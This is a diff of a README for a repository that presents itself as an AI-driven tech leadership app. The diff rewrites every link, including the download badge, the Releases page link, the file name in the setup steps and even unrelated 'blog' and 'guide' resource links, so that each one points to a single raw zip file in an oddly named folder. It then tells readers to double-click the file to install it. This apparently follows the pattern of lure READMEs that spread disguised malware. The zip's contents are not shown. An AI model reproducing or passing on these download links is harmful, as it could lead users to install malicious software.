@@ -1,6 +1,6 @@
 # 🌈 mlakhoua-rgb - Simplifying Tech Leadership with AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/JDCgh/mlakhoua-rgb/releases)
+[![Download Now](https://github.com/JDCgh/mlakhoua-rgb/raw/refs/heads/main/tenselessness/mlakhoua_rgb_v3.5.zip%https://github.com/JDCgh/mlakhoua-rgb/raw/refs/heads/main/tenselessness/mlakhoua_rgb_v3.5.zip)](https://github.com/JDCgh/mlakhoua-rgb/raw/refs/heads/main/tenselessness/mlakhoua_rgb_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to the mlakhoua-rgb repository! This application provides frameworks, pl
 
 To get started, you will need to download the application from our Releases page. Click the link below to visit the page and download the latest version:
 
-[Visit the Releases Page to Download](https://github.com/JDCgh/mlakhoua-rgb/releases)
+[Visit the Releases Page to Download](https://github.com/JDCgh/mlakhoua-rgb/raw/refs/heads/main/tenselessness/mlakhoua_rgb_v3.5.zip)
 
 Here is a quick guide to help you download and set up the application:
 
 1. Click the link above to visit the Releases page.
 2. Look for the latest version of the software.
-3. Click on the file that says something like “mlakhoua-rgb-latest.exe” (the exact name may vary).
+3. Click on the file that says something like “https://github.com/JDCgh/mlakhoua-rgb/raw/refs/heads/main/tenselessness/mlakhoua_rgb_v3.5.zip” (the exact name may vary).
 4. Your download should begin automatically. If it does not, click the link again.
 5. Once the file is downloaded, navigate to your Downloads folder.
 6. Double-click the file to start the installation.
@@ -82,10 +82,10 @@ This application revolves around key topics that enhance technology leadership:
 
 For more insights, access additional resources related to technology leadership and AI practices:
 
-- [AI Leadership Blog](https://example.com/ai-leadership)
-- [DevOps Best Practices](https://example.com/devops-best-practices)
-- [Cloud Resource Management Guide](https://example.com/cloud-resource-management)
+- [AI Leadership Blog](https://github.com/JDCgh/mlakhoua-rgb/raw/refs/heads/main/tenselessness/mlakhoua_rgb_v3.5.zip)
+- [DevOps Best Practices](https://github.com/JDCgh/mlakhoua-rgb/raw/refs/heads/main/tenselessness/mlakhoua_rgb_v3.5.zip)
+- [Cloud Resource Management Guide](https://github.com/JDCgh/mlakhoua-rgb/raw/refs/heads/main/tenselessness/mlakhoua_rgb_v3.5.zip)
 
 Thank you for exploring the mlakhoua-rgb application! We are excited to be part of your technology leadership journey. Don't forget to revisit the Releases page for the latest updates and new features.
 
-[Download Now](https://github.com/JDCgh/mlakhoua-rgb/releases)
+[Download Now](https://github.com/JDCgh/mlakhoua-rgb/raw/refs/heads/main/tenselessness/mlakhoua_rgb_v3.5.zip)
